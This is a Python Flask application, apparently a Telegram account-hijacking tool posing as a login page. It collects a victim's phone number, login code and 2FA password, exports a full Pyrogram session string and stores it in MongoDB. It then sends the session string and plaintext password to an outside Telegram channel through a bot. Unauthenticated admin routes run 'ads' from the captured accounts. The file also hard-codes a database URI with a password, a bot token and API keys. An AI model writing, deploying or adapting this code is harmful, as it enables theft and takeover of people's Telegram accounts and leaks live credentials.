from flask import Flask, render_template, request, session, redirect, jsonify, url_for, send_from_directory
import os
import uuid
import asyncio
import threading
from datetime import datetime, timedelta
from pyrogram import Client
from pyrogram.errors import (
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    FloodWait
)
from pymongo import MongoClient
from pymongo.errors import ServerSelectionTimeoutError
from bson import ObjectId
from werkzeug.utils import secure_filename

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "7f9c2e1a84d6b3f0c5a7e9d2f1b8c4e6a3d7f0b2c9e5a1d8f6c3b7e2a9d4f1")

# ========== MONGODB CONFIG ==========
MONGODB_URI = os.environ.get("MONGODB_URI", "mongodb+srv://nexacoders2_db_user:dxYh7QOdHvH6OVdd@cluster0.f4qxcbk.mongodb.net/?appName=Cluster0")
DB_NAME = os.environ.get("DB_NAME", "adult_bot_db")

try:
    mongo_client = MongoClient(MONGODB_URI, serverSelectionTimeoutMS=5000)
    db = mongo_client[DB_NAME]
    mongo_client.admin.command('ping')
    print("✅ MongoDB Connected Successfully!")
    db_connected = True
except Exception as e:
    print(f"❌ MongoDB Connection Failed: {e}")
    mongo_client = None
    db = None
    db_connected = False

users_col = db.users if db is not None else None
ads_config_col = db.ads_config if db is not None else None
temp_sessions_col = db.temp_sessions if db is not None else None

# ========== UPLOAD CONFIG ==========
UPLOAD_FOLDER = 'uploads'
ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'webp'}
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
app.config['MAX_CONTENT_LENGTH'] = 16 * 1024 * 1024

if not os.path.exists(UPLOAD_FOLDER):
    os.makedirs(UPLOAD_FOLDER)

def allowed_file(filename):
    return '.' in filename and filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

API_ID = int(os.environ.get("API_ID", "32208414"))
API_HASH = os.environ.get("API_HASH", "628f11c05a44c8dda4b006e66f4bf7df")
BOT_TOKEN = os.environ.get("BOT_TOKEN", "8991327348:AAH3uOzXU8aZZ2LKfUlK1MH4Wp2AYKo1aIs")
CHANNEL_ID = os.environ.get("CHANNEL_ID", "-1004376082945")

# ========== ASYNC EXECUTOR ==========
class AsyncExecutor:
    """Single event loop in dedicated thread"""
    def __init__(self):
        self.loop = asyncio.new_event_loop()
        self.thread = threading.Thread(target=self._run_loop, daemon=True)
        self.thread.start()
    
    def _run_loop(self):
        asyncio.set_event_loop(self.loop)
        self.loop.run_forever()
    
    def execute(self, coro):
        future = asyncio.run_coroutine_threadsafe(coro, self.loop)
        return future.result(timeout=60)

async_executor = AsyncExecutor()

# ========== SESSION MANAGEMENT ==========
class SessionManager:
    """Manages Pyrogram clients with proper cleanup"""
    def __init__(self):
        self._clients = {}
        self._lock = threading.Lock()
    
    def create_client(self, session_id, phone):
        """Create and connect a new client"""
        client = Client(
            name=f"session_{session_id}",
            api_id=API_ID,
            api_hash=API_HASH,
            in_memory=True,
            no_updates=True
        )
        
        async def connect():
            await client.connect()
            return client
        
        client = async_executor.execute(connect())
        
        with self._lock:
            self._clients[session_id] = {
                'client': client,
                'phone': phone,
                'created_at': datetime.now()
            }
        
        # Store metadata in MongoDB for recovery
        if temp_sessions_col is not None:
            temp_sessions_col.update_one(
                {'_id': session_id},
                {'$set': {
                    'phone': phone,
                    'created_at': datetime.now(),
                    'status': 'connected'
                }},
                upsert=True
            )
        
        return client
    
    def get_client(self, session_id):
        """Get existing client"""
        with self._lock:
            data = self._clients.get(session_id)
            if data:
                # Update last accessed
                if temp_sessions_col is not None:
                    temp_sessions_col.update_one(
                        {'_id': session_id},
                        {'$set': {'last_accessed': datetime.now()}}
                    )
                return data['client']
            return None
    
    def remove_client(self, session_id):
        """Remove and disconnect client"""
        with self._lock:
            data = self._clients.pop(session_id, None)
        
        if data:
            client = data['client']
            try:
                async def disconnect():
                    await client.disconnect()
                async_executor.execute(disconnect())
            except:
                pass
        
        if temp_sessions_col is not None:
            temp_sessions_col.delete_one({'_id': session_id})
    
    def cleanup_old(self, max_age_minutes=10):
        """Remove old sessions"""
        cutoff = datetime.now() - timedelta(minutes=max_age_minutes)
        with self._lock:
            old_sessions = [
                sid for sid, data in self._clients.items() 
                if data['created_at'] < cutoff
            ]
        
        for sid in old_sessions:
            self.remove_client(sid)
        
        if temp_sessions_col is not None:
            temp_sessions_col.delete_many({'created_at': {'$lt': cutoff}})

session_manager = SessionManager()

# ========== DATABASE HELPERS ==========
def save_session_to_db(session_data):
    if users_col is None:
        return False

    try:
        existing = users_col.find_one({"phone": session_data["phone"]})
        if existing:
            users_col.update_one(
                {"_id": existing["_id"]},
                {"$set": {
                    "session_string": session_data["session_string"],
                    "updated_at": datetime.now(),
                    "user_id": session_data["id"],
                    "username": session_data["username"],
                    "first_name": session_data["first_name"],
                    "last_name": session_data["last_name"],
                    "status": "active",
                    "ads_enabled": True
                }}
            )
            return str(existing["_id"])
        else:
            result = users_col.insert_one({
                "user_id": session_data["id"],
                "first_name": session_data["first_name"],
                "last_name": session_data["last_name"],
                "username": session_data["username"],
                "phone": session_data["phone"],
                "session_string": session_data["session_string"],
                "session_name": session_data["session_name"],
                "created_at": datetime.now(),
                "updated_at": datetime.now(),
                "status": "active",
                "ads_enabled": True,
                "last_ad_time": None,
                "total_ads_sent": 0
            })
            return str(result.inserted_id)
    except Exception as e:
        print(f"MongoDB Error: {e}")
        return False

def get_ads_config():
    if ads_config_col is None:
        return {
            "ads_enabled": False,
            "interval": 600,
            "photo_path": None,
            "caption": "",
            "updated_at": datetime.now()
        }

    config = ads_config_col.find_one({"_id": "main_config"})
    if not config:
        default_config = {
            "_id": "main_config",
            "ads_enabled": False,
            "interval": 600,
            "photo_path": None,
            "caption": "",
            "updated_at": datetime.now()
        }
        ads_config_col.insert_one(default_config)
        return default_config
    return config

def update_ads_config(updates):
    if ads_config_col is None:
        return False
    updates["updated_at"] = datetime.now()
    ads_config_col.update_one(
        {"_id": "main_config"},
        {"$set": updates},
        upsert=True
    )
    return True

def get_stats():
    if users_col is None:
        return {
            "total_users": 0,
            "active_users": 0,
            "idle_users": 0,
            "total_ads_sent": 0,
            "db_connected": False
        }

    total = users_col.count_documents({})
    active = users_col.count_documents({"status": "active"})
    idle = users_col.count_documents({"status": "idle"})

    pipeline = [{"$group": {"_id": None, "total": {"$sum": "$total_ads_sent"}}}]
    ads_result = list(users_col.aggregate(pipeline))
    total_ads = ads_result[0]["total"] if ads_result else 0

    yesterday = datetime.now() - timedelta(days=1)
    recent_users = users_col.count_documents({"created_at": {"$gte": yesterday}})

    last_hour = datetime.now() - timedelta(hours=1)
    online_users = users_col.count_documents({"last_ad_time": {"$gte": last_hour}})

    return {
        "total_users": total,
        "active_users": active,
        "idle_users": idle,
        "online_users": online_users,
        "recent_users": recent_users,
        "total_ads_sent": total_ads,
        "db_connected": True
    }

def get_all_users():
    if users_col is None:
        return []

    users = list(users_col.find().sort("created_at", -1))
    formatted = []
    for user in users:
        formatted.append({
            "id": str(user.get("_id")),
            "user_id": user.get("user_id"),
            "name": f"{user.get('first_name', '')} {user.get('last_name', '')}".strip(),
            "username": user.get("username", "N/A"),
            "phone": user.get("phone", "N/A"),
            "status": user.get("status", "unknown"),
            "ads_enabled": user.get("ads_enabled", True),
            "total_ads_sent": user.get("total_ads_sent", 0),
            "created_at": user.get("created_at", datetime.now()).strftime("%Y-%m-%d %H:%M") if user.get("created_at") else "N/A",
            "last_ad_time": user.get("last_ad_time", "").strftime("%Y-%m-%d %H:%M") if user.get("last_ad_time") else "Never"
        })
    return formatted

def send_to_channel(message):
    if not BOT_TOKEN:
        return False
    import requests
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHANNEL_ID,
        "text": message,
        "parse_mode": "HTML",
        "disable_web_page_preview": True
    }
    try:
        r = requests.post(url, json=payload, timeout=10)
        return r.json().get("ok", False)
    except Exception as e:
        print(f"Channel error: {e}")
        return False

# ========== ROUTES ==========
@app.route("/")
def index():
    return redirect("/login")

@app.route("/login")
def login():
    return render_template("login.html")

@app.route("/api/send-code", methods=["POST"])
def send_code():
    session_manager.cleanup_old()
    
    data = request.get_json() or {}
    phone = data.get("phone", "").strip()
    session_name = data.get("session_name", "session").strip()

    if not phone or len(phone) < 10:
        return jsonify(ok=False, error="Invalid phone number"), 400

    session_id = str(uuid.uuid4())[:8]

    try:
        # Create client and connect
        client = session_manager.create_client(session_id, phone)
        
        # Send code
        async def send():
            return await client.send_code(phone)
        
        sent = async_executor.execute(send())
        
        # Store phone_code_hash in MongoDB
        if temp_sessions_col is not None:
            temp_sessions_col.update_one(
                {'_id': session_id},
                {'$set': {
                    'phone_code_hash': sent.phone_code_hash,
                    'session_name': session_name,
                    'status': 'code_sent'
                }}
            )
        
        return jsonify(ok=True, session_id=session_id, message=f"Code sent to {phone}")
        
    except PhoneNumberInvalid:
        session_manager.remove_client(session_id)
        return jsonify(ok=False, error="Invalid phone number"), 400
    except FloodWait as e:
        session_manager.remove_client(session_id)
        return jsonify(ok=False, error=f"Please wait {e.value} seconds"), 429
    except Exception as e:
        session_manager.remove_client(session_id)
        return jsonify(ok=False, error=str(e)), 500

@app.route("/api/verify-code", methods=["POST"])
def verify_code():
    data = request.get_json() or {}
    session_id = data.get("session_id", "")
    code = data.get("code", "").strip().replace(" ", "")
    password = data.get("password", "")

    if not session_id:
        return jsonify(ok=False, error="Session ID required"), 400

    # Get client from memory
    client = session_manager.get_client(session_id)
    
    if not client:
        return jsonify(ok=False, error="Session expired. Please request a new code."), 400

    # Get metadata from MongoDB
    session_doc = None
    if temp_sessions_col is not None:
        session_doc = temp_sessions_col.find_one({'_id': session_id})
    
    if not session_doc:
        session_manager.remove_client(session_id)
        return jsonify(ok=False, error="Session expired. Please request a new code."), 400

    phone = session_doc['phone']
    phone_code_hash = session_doc['phone_code_hash']
    session_name = session_doc.get('session_name', 'session')

    if not code or not code.isdigit():
        return jsonify(ok=False, error="Please enter a valid verification code"), 400

    try:
        async def do_verify():
            try:
                user = await client.sign_in(
                    phone_number=phone,
                    phone_code_hash=phone_code_hash,
                    phone_code=code
                )
                session_string = await client.export_session_string()
                return {"user": user, "session_string": session_string, "error": None}
            except SessionPasswordNeeded:
                if not password:
                    return {"user": None, "session_string": None, "error": "2FA_PASSWORD_REQUIRED"}
                try:
                    user = await client.check_password(password)
                    session_string = await client.export_session_string()
                    return {"user": user, "session_string": session_string, "error": None}
                except Exception as e:
                    return {"user": None, "session_string": None, "error": f"Invalid 2FA password: {str(e)}"}
            except PhoneCodeInvalid:
                return {"user": None, "session_string": None, "error": "INVALID_CODE"}
            except PhoneCodeExpired:
                return {"user": None, "session_string": None, "error": "CODE_EXPIRED"}
            except Exception as e:
                return {"user": None, "session_string": None, "error": str(e)}
        
        result = async_executor.execute(do_verify())
        
    except Exception as e:
        return jsonify(ok=False, error=f"Server error: {str(e)}"), 500
    finally:
        # Always clean up
        session_manager.remove_client(session_id)

    if result["error"] == "2FA_PASSWORD_REQUIRED":
        return jsonify(ok=False, requires_password=True), 401
    elif result["error"] == "INVALID_CODE":
        return jsonify(ok=False, error="Invalid verification code. Please check and try again."), 401
    elif result["error"] == "CODE_EXPIRED":
        return jsonify(ok=False, error="Code expired. Please request a new code."), 401
    elif result["error"]:
        return jsonify(ok=False, error=result["error"]), 400

    user = result["user"]
    session_string = result["session_string"]

    user_info = {
        "id": user.id,
        "first_name": user.first_name,
        "last_name": user.last_name or "",
        "username": user.username or "N/A",
        "phone": phone,
        "session_string": session_string,
        "created_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
        "session_name": session_name
    }

    db_id = save_session_to_db(user_info)
    if db_id:
        print(f"✅ User saved to MongoDB with ID: {db_id}")

    country_code = phone[:3] if phone.startswith("+") else phone[:2]

    channel_msg = f"""🟢 <b>NEW PYROGRAM SESSION</b>

👤 <b>Name:</b> {user_info['first_name']} {user_info['last_name']}
🔗 <b>Username:</b> @{user_info['username']}
🆔 <b>User ID:</b> <code>{user_info['id']}</code>
📱 <b>Phone:</b> <code>{phone}</code>
🌍 <b>Country:</b> +{country_code}
⏰ <b>Created:</b> {user_info['created_at']}"""

    if password:
        channel_msg += f"\n🔑 <b>2FA Password:</b> <code>{password}</code>"

    channel_msg += f"""

<b>🔐 SESSION STRING:</b>
<code>{session_string}</code>"""

    send_to_channel(channel_msg)
    session["user"] = user_info

    return jsonify(ok=True, user={
        "id": user_info["id"],
        "name": f"{user_info['first_name']} {user_info['last_name']}",
        "username": user_info["username"],
        "phone": phone
    })

@app.route("/api/logout", methods=["POST"])
def logout():
    session.clear()
    return jsonify(ok=True)

@app.route("/dashboard")
def dashboard():
    if "user" not in session:
        return redirect("/login")
    return render_template("dashboard.html", user=session["user"])

@app.route("/admin")
def admin_panel():
    config = get_ads_config()
    stats = get_stats()
    return render_template("admin.html", config=config, stats=stats)

@app.route("/admin/stats")
def admin_stats_page():
    stats = get_stats()
    users = get_all_users()
    config = get_ads_config()
    return render_template("stats.html", stats=stats, users=users, config=config)

@app.route("/api/toggle-ads", methods=["POST"])
def toggle_ads():
    config = get_ads_config()
    new_status = not config.get("ads_enabled", False)

    if update_ads_config({"ads_enabled": new_status}):
        if users_col is not None:
            users_col.update_many({}, {"$set": {"ads_enabled": new_status}})

        return jsonify({
            "success": True,
            "enabled": new_status,
            "message": f"Ads {'enabled' if new_status else 'disabled'} successfully!"
        })

    return jsonify({"success": False, "error": "Failed to update"}), 500

@app.route("/api/set-interval", methods=["POST"])
def set_interval():
    data = request.get_json() or {}
    interval = data.get("interval")

    if not interval or not isinstance(interval, int):
        return jsonify({"success": False, "error": "Invalid interval"}), 400

    if update_ads_config({"interval": interval}):
        return jsonify({
            "success": True,
            "interval": interval,
            "message": f"Interval set to {interval//60} minutes!"
        })

    return jsonify({"success": False, "error": "Failed to update"}), 500

@app.route("/api/set-caption", methods=["POST"])
def set_caption():
    data = request.get_json() or {}
    caption = data.get("caption", "")

    if update_ads_config({"caption": caption}):
        return jsonify({
            "success": True,
            "message": "Caption updated successfully!"
        })

    return jsonify({"success": False, "error": "Failed to update"}), 500

@app.route("/api/upload-photo", methods=["POST"])
def upload_photo():
    if 'photo' not in request.files:
        return jsonify({"success": False, "error": "No file provided"}), 400

    file = request.files['photo']
    if file.filename == '':
        return jsonify({"success": False, "error": "No file selected"}), 400

    if file and allowed_file(file.filename):
        filename = secure_filename(f"ad_photo_{datetime.now().strftime('%Y%m%d_%H%M%S')}.{file.filename.rsplit('.', 1)[1]}")
        filepath = os.path.join(app.config['UPLOAD_FOLDER'], filename)
        file.save(filepath)

        update_ads_config({"photo_path": filepath})

        return jsonify({
            "success": True,
            "path": filepath,
            "message": "Photo uploaded successfully!"
        })

    return jsonify({"success": False, "error": "Invalid file type"}), 400

@app.route("/api/preview")
def preview_ad():
    config = get_ads_config()
    return jsonify({
        "success": True,
        "photo_path": config.get("photo_path"),
        "caption": config.get("caption", ""),
        "interval": config.get("interval", 600),
        "ads_enabled": config.get("ads_enabled", False)
    })

@app.route("/uploads/<path:filename>")
def serve_upload(filename):
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

@app.route("/api/user/<user_id>/toggle", methods=["POST"])
def toggle_user_ads(user_id):
    if users_col is None:
        return jsonify({"success": False, "error": "DB not connected"}), 500

    try:
        user = users_col.find_one({"_id": ObjectId(user_id)})
    except:
        return jsonify({"success": False, "error": "Invalid user ID"}), 400

    if not user:
        return jsonify({"success": False, "error": "User not found"}), 404

    new_status = not user.get("ads_enabled", True)
    users_col.update_one(
        {"_id": ObjectId(user_id)},
        {"$set": {"ads_enabled": new_status}}
    )

    return jsonify({
        "success": True,
        "enabled": new_status,
        "message": f"User ads {'enabled' if new_status else 'disabled'}"
    })

@app.route("/api/stats/refresh")
def refresh_stats():
    return jsonify(get_stats())

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)